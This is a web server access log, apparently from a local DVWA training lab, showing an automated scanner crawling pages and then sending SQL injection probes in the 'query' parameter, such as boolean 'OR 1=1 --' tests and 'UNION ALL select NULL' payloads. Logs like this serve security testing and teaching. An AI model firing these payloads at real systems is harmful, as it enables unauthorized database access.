172.17.0.1 - - [12/Feb/2019:08:55:22 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:22 +0000] "GET /dvwa/images/spanner.png?query=zApPX12sS HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:22 +0000] "GET /dvwa/js?query=zApPX13sS HTTP/1.1" 301 558 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:22 +0000] "GET /dvwa/js/add_event_listeners.js?query=zApPX14sS HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:22 +0000] "GET /dvwa/js/dvwaPage.js?query=zApPX15sS HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:22 +0000] "GET /favicon.ico?query=zApPX16sS HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:22 +0000] "GET /instructions.php?query=zApPX17sS HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:22 +0000] "GET /instructions.php?doc=zApPX18sS HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:23 +0000] "GET /login.php?query=zApPX19sS HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:23 +0000] "POST /login.php?query=zApPX20sS HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:23 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:23 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:23 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:23 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:23 +0000] "GET /robots.txt?query=zApPX25sS HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:23 +0000] "GET /setup.php?query=zApPX26sS HTTP/1.1" 200 4628 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:23 +0000] "POST /setup.php?query=zApPX27sS HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:23 +0000] "GET /sitemap.xml?query=zApPX28sS HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:23 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:23 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:23 +0000] "GET / HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:23 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:23 +0000] "GET /about.php HTTP/1.1" 200 5293 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:23 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:23 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:23 +0000] "GET /docs/DVWA_v1.3.pdf HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:24 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:24 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:24 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:24 +0000] "GET /dvwa/css/login.css HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:24 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:24 +0000] "GET /dvwa/css/main.css HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:24 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:24 +0000] "GET /dvwa/images/login_logo.png HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:24 +0000] "GET /dvwa/images/logo.png HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:24 +0000] "GET /dvwa/images/RandomStorm.png HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:24 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:24 +0000] "GET /dvwa/images/spanner.png HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:24 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:24 +0000] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:24 +0000] "GET /dvwa/js/dvwaPage.js HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:24 +0000] "GET /favicon.ico HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /instructions.php HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /instructions.php?doc=PHPIDS-license HTTP/1.1" 200 10862 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /robots.txt HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /sitemap.xml HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=%27 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=%27 HTTP/1.1" 200 5193 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query%27 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=%3B HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query%3B HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query%27 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=%29 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query%29 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET / HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET / HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query+AND+1%3D1+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query+AND+1%3D2+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query+OR+1%3D1+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query+AND+1%3D2+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query+OR+1%3D1+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=%22 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 302 300 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query%22 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET / HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=%3B HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query%3B HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=%29 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query%29 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query+AND+1%3D1+--+ HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query+AND+1%3D2+--+ HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query+OR+1%3D1+--+ HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query+AND+1%3D2+--+ HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query+OR+1%3D1+--+ HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /about.php HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=%27 HTTP/1.1" 301 540 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=query%27 HTTP/1.1" 301 550 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs/DVWA_v1.3.pdf?query=%27 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=%22 HTTP/1.1" 301 540 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
